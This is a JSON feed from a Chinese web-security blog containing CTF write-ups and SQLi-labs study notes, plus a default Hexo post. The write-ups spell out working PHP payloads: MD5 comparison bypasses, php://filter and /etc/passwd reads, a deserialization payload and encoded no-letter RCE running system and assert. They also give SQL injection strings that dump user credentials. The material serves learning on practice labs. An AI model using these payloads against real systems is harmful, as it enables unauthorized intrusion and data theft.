{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog",
    "description": "不定时更新web安全相关知识",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/04/26/nessctf/",
            "url": "http://example.com/2023/04/26/nessctf/",
            "title": "",
            "date_published": "2023-04-25T16:51:04.501Z",
            "content_html": "<h3 id=\"1easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#1easy_md5\">#</a> 1.easy_md5</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php     highlight_file(__FILE__);    include &#x27;flag2.php&#x27;;       if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;    $name = $_GET[&#x27;name&#x27;];    $password = $_POST[&#x27;password&#x27;];       if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;           echo $flag;       &#125;       else &#123;           echo &quot;wrong!&quot;;       &#125;       &#125;   else &#123;       echo &#x27;wrong!&#x27;;   &#125;   ?&gt;`</span><br></pre></td></tr></table></figure>\n<p>md5 弱类型比较<br>\n (1).0e 绕过<br>\n以下是一些字符串 md5 值以 0e 开头<br>\n QNKCDZO<br>\n240610708<br>\ns878926199a<br>\ns155964671a<br>\ns21587387a</p>\n<p>(2). 数组绕过<br>\n md5 () 函数计算的是一个字符串的哈希值，对于数组则返回 false<br>\n <code>payload:?a[]=1&amp;b[]=2</code></p>\n<h3 id=\"2caidao\"><a class=\"markdownIt-Anchor\" href=\"#2caidao\">#</a> 2.caidao</h3>\n<p>(1) antsword 连<br>\n (2) hackbar 传参:`wllm=system (‘cat …/…/…/flag’);</p>\n<h3 id=\"3include\"><a class=\"markdownIt-Anchor\" href=\"#3include\">#</a> 3.include</h3>\n<p>(1) filter 伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>这题用 file 协议也可以但是没有得到 flag<br>\n 可以这样:?file= <code>file:///etc/passwd</code> <br>\n 但是 <code>?file=file:///var/www/flag.php</code>  不行<br>\n<strong>想深刻了解伪协议的来这里</strong></p>\n<h3 id=\"4ezrce\"><a class=\"markdownIt-Anchor\" href=\"#4ezrce\">#</a> 4.ezrce</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php   error_reporting(0);   highlight_file(__FILE__);   if(isset($_GET[&#x27;url&#x27;]))   &#123;   eval($_GET[&#x27;url&#x27;]);   &#125;`</span><br></pre></td></tr></table></figure>\n<p>学习 Linux 命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls / 列出根目录(\\)下的所有目录</span><br><span class=\"line\">发现flag文件在root根目录下,cat /flllllllag来cat根目录下的flag文件</span><br></pre></td></tr></table></figure>\n<p><strong>深刻了解 Linux 命令来这里</strong></p>\n<h3 id=\"5easysql-suctf2019\"><a class=\"markdownIt-Anchor\" href=\"#5easysql-suctf2019\">#</a> 5.EasySQL SUCTF2019</h3>\n<p>fuzz:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1--+</span><br><span class=\"line\">1&#x27; order by 3--+</span><br><span class=\"line\">1&#x27; and updatexml(1,concat(0x7e,database()),1)--+</span><br><span class=\"line\">1&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>堆叠注入:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;show databases#</span><br><span class=\"line\">1;show tables#</span><br><span class=\"line\">这两个还可以</span><br><span class=\"line\">1;show columns from &#x27;Flag&#x27;#</span><br><span class=\"line\">失败</span><br></pre></td></tr></table></figure>\n<p>它的 SQL 查询语句是:<br>\n <code>select $_POST['query']||flag from Flag</code> <br>\n 说真的我猜不出来<br>\n当 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 是字符串连接符，相当于 concat () 函数</p>\n<p><code>payload1:*,1</code> <br>\nsql: <code>select *,1||flag from Flag</code> , 这样查询出了 Flag 表的所有内容<br>\n此处的 1 是临时增加一列，列名为 1||flag 且这一列的所有值都为 1</p>\n<p>payload2: <code>1;set sql_mode=PIPES_AS_CONCAT;select 1 sql:</code> select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</p>\n<p>返回一个列名为 1||flag, 列元素为 1flag 的值的表</p>\n<h3 id=\"6zjctf-2019nizhuansiwei\"><a class=\"markdownIt-Anchor\" href=\"#6zjctf-2019nizhuansiwei\">#</a> 6.[ZJCTF 2019]NiZhuanSiWei</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$text = $_GET[&quot;text&quot;];</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">$password = $_GET[&quot;password&quot;];</span><br><span class=\"line\">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class=\"line\">        echo &quot;Not now!&quot;;</span><br><span class=\"line\">        exit(); </span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        include($file);  //useless.php</span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        echo $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>第一步：绕过 file_get_contents<br>\n(1)php://input<br>\n?text=php://input<br>\npost 传参: <code>welcome to the zjctf</code> <br>\n (2) data 协议<br>\n <code>?text=data://text/plain,welcome to the zjctf</code> <br>\n 根据提示的 useless.php 可以发现可以用伪协议读取<br>\n <code>file=php://filter/read=convert.base64-encode/resource=useless.php</code> <br>\n 第一步:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:welcome to the zjct</span><br></pre></td></tr></table></figure>\n<p>经过 base64 解码得到 useless.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\"></span><br><span class=\"line\">class Flag&#123;  //flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;  </span><br></pre></td></tr></table></figure>\n<p>注意 tostring 魔术方法在对象被当作字符串处理时会调用，index 里就是 echo</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Flag&#123;    </span><br><span class=\"line\">    public $file=&#x27;flag.php&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$p=new Flag();</span><br><span class=\"line\">echo urlencode(serialize($p));</span><br><span class=\"line\">?&gt;  </span><br><span class=\"line\"></span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>\n<p>`<br>\n 最终 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=file=php://input&amp;&amp;file=useless.php&amp;&amp;password=</span><br><span class=\"line\">O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:welcome to the zjct</span><br></pre></td></tr></table></figure>\n<p>检查可发现源代码注释部分有 flag</p>\n<h3 id=\"7easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#7easy_md5\">#</a> 7.easy_md5</h3>\n<p>F12-&gt; 网络 -&gt; 请求头 -&gt;hint</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$password</span>,<span class=\"literal\">true</span>).<span class=\"string\">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: ffifdyop</span><br><span class=\"line\">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class=\"line\">raw: &#x27;or&#x27;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</span><br><span class=\"line\">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure>\n<p>注意:<br>\n <code>\\和后面三个字符算一个字符</code> <br>\n sql:``select * from admin where username=‘admin’ and password=’&quot;‘or’6]!r,b&quot;’;</p>\n<p>在 mysql 里面，在用作布尔型判断时，以 1 开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如 password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于 password=‘xxx’ or 1  ，也就相当于 password=‘xxx’ or true，所以返回值就是 true</p>\n<p>关键是:<mark>’ or 1’</mark><br>\n答案肯定不止一个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content: 129581926211651571912466741651878684928</span><br><span class=\"line\">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class=\"line\">raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1&#x27;or&#x27;8</span><br><span class=\"line\">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure>\n<p>复现:<br>\n![[Pasted image 20230425192651.png]]</p>\n<p>然后就是常规的数组绕过，0e 绕过了</p>\n<h3 id=\"8swpuctf-2021-新生赛hardrce\"><a class=\"markdownIt-Anchor\" href=\"#8swpuctf-2021-新生赛hardrce\">#</a> 8.[SWPUCTF 2021 新生赛] hardrce</h3>\n<h4 id=\"无字母rce\"><a class=\"markdownIt-Anchor\" href=\"#无字母rce\">#</a> 无字母 rce</h4>\n<ol>\n<li>system () 函数</li>\n</ol>\n<ul>\n<li>执行外部程序并显示输出资料</li>\n</ul>\n<ol start=\"2\">\n<li>eval () 函数</li>\n</ol>\n<ul>\n<li>把字符串当 php 代码执行，必须以；结尾</li>\n</ul>\n<ol start=\"3\">\n<li>php 的取反问题～<br>\n 此题过滤了很多黑名单，根据题目提示是无字母 rce 想到了～</li>\n</ol>\n<ul>\n<li>对于数字取反的规则可以看看这篇:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx\">https://blog.csdn.net/WilliamsWayne/article/details/78259501</span></li>\n<li>对于字符取反，由于有大量的不可显字符，要 url 编码</li>\n<li>方法一:</li>\n<li>eg1.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;phpinfo&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>\n<p>payload:(~%8F%97%8F%96%91%99%90<br>\n)();</p>\n<p>配合 eval 函数可以直接把 phpinfo (); 当 php 代码执行<br>\n eg2.<br>\n 要构造 <code>assert($_POST[1])</code>  语句，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=urlencode(~&quot;assert&quot;);</span><br><span class=\"line\">$b=urlencode(~&quot;_POST&quot;);</span><br><span class=\"line\">echo $a;</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo $b;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">得到</span><br><span class=\"line\">%9E%8C%8C%9A%8D%8B</span><br><span class=\"line\">%A0%AF%B0%AC%AB</span><br><span class=\"line\"></span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert</span><br><span class=\"line\">$__=~(%A0%AF%B0%AC%AB);   //$__=_POST</span><br><span class=\"line\">$___=$$__;         //$___=$_POST</span><br><span class=\"line\">$_($___[1]);      //assert($_POST[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">payload(写在一行):</span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">post:</span><br><span class=\"line\">1=phpinfo();</span><br></pre></td></tr></table></figure>\n<p>常见取反 url:</p>\n<ol>\n<li>system:%8C%86%8C%8B%9A%92</li>\n<li>ls /:%93%8C%DF%D0<br>\n <code>system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></li>\n<li>cat:%9C%9E%8B</li>\n<li>cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98</li>\n<li>cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98<br>\n 可自行运行得:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;xxx&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&quot;卢&quot;.encode(&quot;utf8&quot;))</span><br><span class=\"line\">b&#x27;\\xe5\\x8d\\xa2&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=&quot;卢&quot;;</span><br><span class=\"line\">print(~($_&#123;1&#125;));</span><br><span class=\"line\">print(~&quot;\\x8d&quot;);</span><br><span class=\"line\">// 输出rr</span><br></pre></td></tr></table></figure>\n<p><code>$_&#123;1&#125;是\\x8d,\\x8d取反是r</code></p>\n<p>此题 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br><span class=\"line\"></span><br><span class=\"line\">system(&quot;cat /flllllaaaaaaggggggg&quot;);</span><br></pre></td></tr></table></figure>\n<p><strong>深刻学习无字母 rce 来这里</strong></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/04/24/sqli-labs/",
            "url": "http://example.com/2023/04/24/sqli-labs/",
            "title": "",
            "date_published": "2023-04-23T16:32:55.178Z",
            "content_html": "<h3 id=\"怎么判断字符型或者数字型\"><a class=\"markdownIt-Anchor\" href=\"#怎么判断字符型或者数字型\">#</a> 怎么判断字符型或者数字型？</h3>\n<p>数字型:id=2 和 id=3-1 返回界面相同<br>\n原理：说明 2-1 被解析了，旁边没有引号<br>\n字符型:id=2 和 id=2a 页面一样就行<br>\n原理：MySQL 等号两边类型不一致会发生强制转换，字符串 -&gt; 数字</p>\n<p>group_concat 是用，连接多行记录的函数</p>\n<p>less1<br>\n 字符型注入<br>\n看源码:sql=“SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>\n<p>因此:<mark>payload:1’   操作   --+</mark></p>\n<p>?id=1’ order by 3–+<br>\n?id=1’ order by 4–+<br>\n?id=-1’ union select 1,2,3–+// 判断回显位<br>\n？id=-1’ union select 1,2,database ()–+<br>\n?id=-1’ union select1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>\n<p>?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’ and table_schema=database()–+</p>\n<p>?id=-1’ union select 1,group_concat(username),group_concat(password) from users–+</p>\n<p>less2<br>\n 数字型<br>\n看源码:sql=“SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br>\n 直接输入数字就好，解法与 less1 相同，去掉 less1 的’和–+ 即可</p>\n<p>布尔盲注:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select mid((group_concat(username,0x7e,password) from users),1,1))=&#x27;D&#x27;</span><br></pre></td></tr></table></figure>\n<p>less3<br>\nid=1’)–+</p>\n<p>less4<br>\nid=1&quot;)–+</p>\n<p>less5<br>\n 报错注入:updatexml 函数<br>\n updatexml (xml_doument,XPath_string,new_value)<br>\n 第一个参数：XML 的内容<br>\n第二个参数：是需要 update 的位置 XPATH 路径<br>\n第三个参数：是更新后的内容<br>\n所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式，不对就爆出正确内容<br>\n可以校验的：0x7e (~),0x5e24 (^$),’#’(#)<br>\npayload:<br>\n?id=1’ and updatexml (1,concat (0x7e,database ()),1)–+ 暴当前数据库</p>\n<p>?id=1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1)–+<br>\n 此时会出现 Subquery returns more than 1 row<br>\n1. 可以用 limit 解决，limit 0,1 1,1 2,1 3,1<br>\n 在 limit 3,1 找到 users 表<br>\n？id=1’ and updatexml (1,concat (0x7e,(select table_name from information_schema.tables where table_schema=database () limit 3,1)),1)–+<br>\n 后面同理爆字段<br>\n 2. 加个 group_concat 解决<br>\n？id=1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1)–+<br>\n 过程同上<br>\n最后<br>\n？id=1’ and updatexml (1,concat (0x7e,(select group_concat (username) from users)),1)–+</p>\n<p>substr 方法<br>\n’ or updatexml (1,concat (0x7e,substr ((select group_concat (schema_name) from information_schema.schemata),1,31),0x7e),1)–+<br>\n 后面把 1,31 换成 32,31<br>\n63,31<br>\n94,31</p>\n<p>less6<br>\nid=1&quot; 与 less5 一样</p>\n<p>less7<br>\n 布尔盲注<br>\n根据页面回显试探数据，可以二分法，函数:substring (),mid (),substr ().<br>\neg.?id=1’ and (select mid((select concat(user,0x7e,password) from users),1,1))=’’–+<br>\n 一直到 less10, 布尔和时间盲注直接用 sqlimap</p>\n<p>less11<br>\n 输入？id=1 发现 url 地址没有显示，抓包发现 post 方式<br>\n uname=11&amp;passwd=1&amp;submit=Submit<br>\n 判断字符型<br>\n接下来用基本的 union 注入就欧克<br>\n less12<br>\n&quot;) 型，联合注入<br>\n less13<br>\n)’ # 加上报错注入<br>\n less14<br>\n“# 加上报错注入<br>\n less15<br>\n 不显示报错信息只能盲注<br>\n单引号字符型的布尔盲注:<br>\n1’ --+<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1sZXNzMTUtMmc0bTA3M2dtcXcucHk=\"> 用脚本 less15.py</span><br>\n 用法:<br>\nfrom less15 import *<br>\nDatabase15()<br>\nTables15()<br>\n Columns15 (‘库’,‘表’)<br>\n Content15 (‘库’,‘表’,‘字段’,‘字段’)<br>\nless16<br>\n 双引号字符型加括号的盲注<br>\n 1”) --+<br>\n 脚本:less16.py</p>\n<p>less17<br>\n1. 注入点在 password 栏里，单引号字符加报错注入<br>\n 2. 先抓包，copy to file, 用 sqlmap 工具<br>\n python3 <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 路径</p>\n<p>less18<br>\n 注入点在 user-agent, 且用户名密码必须正确<br>\n注意：闭合之前的部分必须为空，很恶心<br>\n’ or updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1) or’</p>\n<p>最后:<br>\n’ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’</p>\n<p>less19<br>\n 与 18 一样，注入点在 referer</p>\n<p>less20<br>\n 输入正确的用户名和密码，抓到两个包，get 包里有 cookie, 注入点在 cookie</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/04/23/hello-world/",
            "url": "http://example.com/2023/04/23/hello-world/",
            "title": "Hello World",
            "date_published": "2023-04-23T15:55:29.640Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}